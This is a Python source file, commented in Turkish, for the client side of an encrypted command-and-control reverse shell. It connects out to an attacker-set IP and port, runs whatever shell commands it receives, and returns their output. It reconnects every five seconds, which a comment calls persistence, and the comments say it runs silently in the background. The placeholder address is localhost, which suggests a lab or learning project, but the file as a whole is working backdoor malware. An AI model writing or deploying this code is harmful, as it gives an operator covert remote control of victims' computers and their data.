import socket
import subprocess
import os
import time
import sys
from common import encrypt, decrypt

# Saldırganın IP'si (Kendi yerel IP adresini buraya yazmalısın)
C2_IP = "127.0.0.1" 
C2_PORT = 8888

def execute_command(command):
    """Gelen sistem komutunu çalıştırır ve çıktısını alır."""
    try:
        # 'cd' komutu özel işlem gerektirir (Process değil, dizin değişimi)
        if command.startswith("cd "):
            target_dir = command[3:].strip()
            os.chdir(target_dir)
            return f"[+] Dizin değiştirildi: {os.getcwd()}"
        
        # Diğer komutları shell'de çalıştır
        output = subprocess.check_output(command, shell=True, stderr=subprocess.STDOUT)
        return output.decode()
    except Exception as e:
        return f"[ERR] Command Execution Failed: {e}"

def connect_to_c2():
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            # Bağlantı kurmaya çalış
            s.connect((C2_IP, C2_PORT))
            
            while True:
                # 1. Şifreli Komutu Al
                encrypted_cmd = s.recv(1024).decode()
                
                if not encrypted_cmd:
                    break
                
                # 2. Komutu Çöz
                command = decrypt(encrypted_cmd)
                
                if command.lower() == "exit":
                    break
                
                # 3. Komutu Çalıştır
                result = execute_command(command)
                
                # 4. Sonucu Şifrele ve Geri Yolla
                encrypted_result = encrypt(result)
                s.send(encrypted_result.encode())
                
            s.close()
        except Exception:
            # Bağlantı başarısızsa 5 saniye bekle ve tekrar dene (Persistence)
            time.sleep(5)

if __name__ == "__main__":
    # Arka planda sessizce çalışması için
    connect_to_c2()
